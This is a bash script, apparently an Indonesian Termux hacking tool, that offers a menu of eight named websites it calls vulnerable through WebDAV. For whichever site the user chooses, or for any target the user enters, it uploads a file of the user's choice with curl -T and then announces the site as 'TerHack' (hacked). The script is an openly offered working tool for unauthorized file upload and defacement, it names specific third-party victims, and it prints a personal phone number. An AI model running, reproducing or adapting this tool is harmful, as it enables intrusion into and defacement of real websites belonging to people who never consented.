#!/usr/bin/bash
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #purple
ku='\033[33;1m' #kuning
pth='\033[00m' #putih

clear
echo ""
echo ""
echo ""
toilet -f standard "Hello World [!]"
echo ""
echo $ku"========================================================="
echo ""
echo $cy"               Author : Squ4r3-B4D                       "
echo $cy"               Team   : Black Venom Cyber                "
echo ""
echo $cy"               Whatsapp : 081326848668                   "
echo $cy"               Support  : Mr.L0ck4lH05t                  "
echo ""
echo $ku"========================================================="
echo ""
echo $bi"========================================================="
echo $me"Kumpulan Web Vuln Webdav :v      "
echo $cy"=>"
echo $me"[1]. "$cy"http://contsol.co.za/"
echo $me"[2]. "$cy"http://ayk.co.za/"
echo $me"[3]. "$cy"http://esfml.com/"
echo $me"[4]. "$cy"http://orders.southeasternfood.com/"
echo $me"[5]. "$cy"http://grupo-cma.com/"
echo $me"[6]. "$cy"http://hellomobile.mobi/"
echo $me"[7]. "$cy"http://myownemailer.com/"
echo $me"[8]. "$cy"http://cmweb.co.za/"
echo ""
echo $ku"Punya Target Sendiri [?]"
echo ""
echo $me"[9]. "$cy"Target Sinih Vuln Yaa!!"
echo $me"[0]. "$cy"Ingin Keluar Silahkan :c"
echo ""
echo $ku"Script Harus Berada Di Luar Folder cuukk [!]"
echo $ku"==================="
echo $ku"Silahkan Pilih Menu"
echo $ku"==================="
read -p " => " EDITOR;
if [ $EDITOR = 1 ]
then
clear
toilet -f slant "Tunggu.." | lolcat
echo ""
pkg install php
clear
echo ""
echo ""
echo $cy"• Masukan Script Loe"
read -p "=> " script
echo $cy" Loading Prosess "
curl -T /storage/emulated/0/$script http://contsol.co.za/
echo $cy"========Done======="
echo $me"TerHack > http://contsol.co.za/$script"
exit
fi
if [ $EDITOR = 2 ]
then
clear
toilet -f slant "Tunggu.." | lolcat
echo ""
pkg install php
clear
echo ""
echo ""
echo $cy"• Masukan Script Loe"
read -p "=> " script
echo $cy" Loading Prosess "
curl -T /storage/emulated/0/$script http://ayk.co.za/
echo $cy"========Done========"
echo $me"TerHack > http://ayk.co.za/$script"
exit
fi
if [ $EDITOR = 3 ]
then
clear
toilet -f slant "Tunggu.." | lolcat
echo ""
pkg install php
clear
echo ""
echo ""
echo $cy"• Masukan Script Loe"
read -p "=> " script
echo $cy" Loading Prosess "
curl -T /storage/emulated/0/$script http://esfml.com/
echo $cy"========Done========"
echo $me"TerHack > http://esfml.com/$script"
exit
fi
if [ $EDITOR = 4 ]
then
clear
toilet -f slant "Tunggu.." | lolcat
echo ""
pkg install php
clear
echo ""
echo ""
echo $cy"• Masukan Script Loe"
read -p "=> " script
echo $cy" Loading Prosess "
curl -T /storage/emulated/0/$script http://orders.southeasternfood.com/
echo $cy"=========Done========="
echo $me"TerHack > http://orders.southeasternfood.com/$script"
exit
fi
if [ $EDITOR = 5 ]
then
clear
toilet -f slant "Tunggu.." | lolcat
echo ""
pkg install php
clear
echo ""
echo ""
echo $cy"• Masukan Script Loe"
read -p "=> " script
echo $cy" Loading Prosess "
curl -T /storage/emulated/0/$script http://grupo-cma.com/
echo $cy"=========Done========="
echo $me"TerHack > http://grupo-cma.com/$script"
exit
fi
if [ $EDITOR = 6 ]
then
clear
toilet -f slant "Tunggu.." | lolcat
echo ""
pkg install php
clear
echo ""
echo ""
echo $cy"• Masukan Script Loe"
read -p "=> " script
echo $cy" Loading Prosess "
curl -T /storage/emulated/0/$script http://hellomobile.mobi/
echo $cy"=========Done========="
echo $me"TerHack > http://hellomobile.mobi/$script"
exit
fi
if [ $EDITOR = 7 ]
then
clear
toilet -f slant "Tunggu.." | lolcat
echo ""
pkg install php
clear
echo ""
echo ""
echo $cy"• Masukan Script Loe"
read -p "=> " script
echo $cy" Loading Prosess "
curl -T /storage/emulated/0/$script http://myownemailer.com/
echo $cy"=========Done========="
echo $me"TerHack > http://myownemailer.com/$script"
exit
fi
if [ $EDITOR = 8 ]
then
clear
toilet -f slant "Tunggu.." | lolcat
echo ""
pkg install php
clear
echo ""
echo ""
echo $cy"• Masukan Script Loe"
read -p "=> " script
echo $cy" Loading Prosess "
curl -T /storage/emulated/0/$script http://cmweb.co.za/
echo $cy"=========Done========="
echo $me"TerHack > http://cmweb.co.za/$script"
exit
fi
if [ $EDITOR = 9 ]
then
clear
toilet -f slant "Tunggu.." | lolcat
echo ""
pkg install php
clear
echo ""
echo ""
echo $bi"[!] Scipt Di Taruh Luar Folder [!]"
echo $me"=================================="
echo $bi"Nama Script Loe "
read -p "Sini =>" script
echo $bi"Target Harus Vuln Cook [!]"
echo $me"====================================="
echo $ku"Target WebVuln Punya Elu"
read -p "Sini => " target
curl -T /storage/emulated/0/$script $target
echo ""
echo $bi"Nih Hasilnyaa [!]"
echo "Silahkan Cek Web $target/$script"
echo "================================"
exit
fi
if [ $EDITOR = 0 ]
then
clear
toilet -f slant "Byee!" | lolcat
echo ""
echo $ku"Thanks You Broow"
echo $ku"Jangan Lupa Pakai lagi"
echo $ku"Jika Ada Bug / Kesalahan"
echo $ku"Hubungi : 081326848668 (WhatsApp)"
echo $cy"Author : 434 EDITOR"
sleep 2
exit
fi
